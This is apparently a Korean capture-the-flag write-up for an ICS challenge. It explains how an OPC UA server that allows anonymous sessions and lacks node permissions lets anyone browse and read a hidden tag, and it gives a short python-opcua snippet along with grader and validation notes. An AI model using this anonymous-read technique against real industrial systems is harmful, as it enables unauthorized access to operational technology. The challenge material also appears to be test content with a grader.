# ICS-001 — OPC UA 익명 태그 열람 (실 OPC UA/TCP) 라이트업

- 분야: ics / 난이도: easy / MITRE ATT&CK for ICS: T0886(Remote Services)

## 무엇이 달라졌나 (목업 → 실 프로토콜)
이 챌린지는 **진짜 OPC UA 바이너리 프로토콜**(포트 4840)을 말한다. 프로토콜 코어는 플랫폼
트윈과 동일한 `shared/ics/opcua.py` 를 재사용하므로 UaExpert·`opcua-client`·`python-opcua`
가 그대로 붙는다. 취약점은 HTTP 엔드포인트가 아니라 **OPC UA 익명 세션 + 노드 권한 부재**다.

## 의도된 해법 (전부 실 OPC UA 위에서)
1. HEL→ACK, `OpenSecureChannel`(SecurityPolicy None) → 보안채널 개설.
2. `CreateSession` → `ActivateSession`(**Anonymous**) → 인증 없이 세션 활성화(취약점).
3. `Browse` → 주소공간 열거. 은닉 진단 노드 `ns=4;s=Diag.Maint_<hmac8>` 발견.
4. `Read`(진단 노드) → 노드 값 = `flag{opcua_anon_read_<hmac12>}`.

## 실 도구 예시 (python-opcua)
```python
from opcua import Client
c = Client("opc.tcp://<host>:4840"); c.connect()   # 익명 세션
for node in c.get_objects_node().get_children():   # Browse
    print(node)
val = c.get_node("ns=4;s=Diag.Maint_<hmac8>").get_value()  # Read → flag
```

## 검증
- 스키마: `schema_validate.py --challenge ICS-001`.
- 로컬 라이브: `docker compose -f deploy/docker-compose.yaml up --build` 후
  `python solution/exploit.py`(실 OPC UA 세션 왕복) → 플래그. `red_grader.grade_red` 통과.
- 인스턴스는 `TEAM_ID` 에 귀속(팀별 HMAC NodeId·플래그) — 감사 S-3 위조 방지 유지.
